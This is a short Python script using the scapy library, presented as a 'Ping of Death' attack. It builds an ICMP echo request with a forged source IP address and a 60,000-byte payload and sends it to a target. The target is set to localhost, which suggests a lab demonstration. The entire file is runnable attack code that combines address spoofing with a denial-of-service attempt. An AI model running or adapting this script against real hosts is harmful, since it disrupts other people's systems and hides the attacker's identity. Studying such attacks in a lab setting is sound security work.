from scapy.all import *
# **************************************************************************************
# Function to create a ping (ICMP Echo Request) packet with a large payload.
# Type 8 is the ICMP Echo Request.
# Data is the Large payload for the Ping of Death attack
# Create IP layer with a fabricated source IP
# Create ICMP Echo Request packet with a large payload
# Send a Ping of Death packet to the target IP address.
# **************************************************************************************
def create_ping_of_death_packet(source_ip, target_ip):
    """
    Create and send a Ping of Death packet with a fabricated source IP.
    """
    
    ip = IP(src=source_ip, dst=target_ip)
    
    icmp = ICMP(type=8, code=0)
    data = b'X' * 60000  # Large payload
    packet = ip/icmp/data
       
    send(packet, verbose=1)
    print(f"Ping of Death packet sent from {source_ip} to {target_ip}")
    
# **************************************************************************************
# Main function to execute the Ping of Death attack.
# **************************************************************************************
if __name__ == "__main__":
    source_ip = "127.0.0.100"  
    target_ip = "127.0.0.1"      
    create_ping_of_death_packet(source_ip, target_ip)
